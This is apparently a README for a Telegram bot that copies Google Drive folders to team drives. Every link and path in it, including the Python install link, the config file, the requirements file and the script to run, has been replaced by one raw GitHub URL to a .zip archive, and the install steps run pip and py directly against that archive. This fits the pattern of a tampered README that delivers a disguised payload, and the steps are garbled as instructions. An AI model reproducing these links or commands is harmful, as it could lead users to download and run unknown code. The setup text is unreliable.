<h1 align="center">⚡ Clonebot ⚡<br></h1> 

<br />

<p align="center">CloneBot is a telegram bot that allows you to copy folder/team drive to team drives. One of the main advantage of this bot is that you can host it to Heroku for free.<p/>

<br />

#### ✅ Advantages
- Use server side copy
- Bypass the 750Gb a day limit thanks to Service accounts
- Duplicate team drive
- Copy public folders & files to team drives
- [Host it to heroku](https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip)

#### ❌ Drawbacks
- Does not support files upload (only copy)
- You cannot copy the data to My Drive

Note : there are hidden features, check at the source code of the bot to find them 🙃

## 💠 Host the bot on your computer

1. Download the repo : https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip
2. Open the https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip file (inside the telegram_gcloner folder) and fill the following values :


> path_to_gclone =./gclone  ⚠ Don't touch this
>
> telegram_token = go to @BotFather and send /newbot to get one
>
> user_ids = -1 = Your user id (go to @MissRose_bot and type /id to get your id) - If you want to authorize multiple users, add a comma between each ID (ex: 150654065,5897065)
> 
> group_ids = your telegram group ID (leave it blank if you don't want to add one). To get your group id, go to @MissRose_bot and type /id
> 
> gclone_para_override = leave this empty if you don't know how to use it

3. Install [python](https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip)
4. open CMD and cd to the folder containing the bot
5. run `pip install -r https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip`
6. cd to the telegram_gcloner folder and run : `py https://raw.githubusercontent.com/sudhanshukrtalan/CloneBot/master/telegram_gcloner/handlers/Clone-Bot-3.9.zip`
7. Start your bot and you can copy your data !
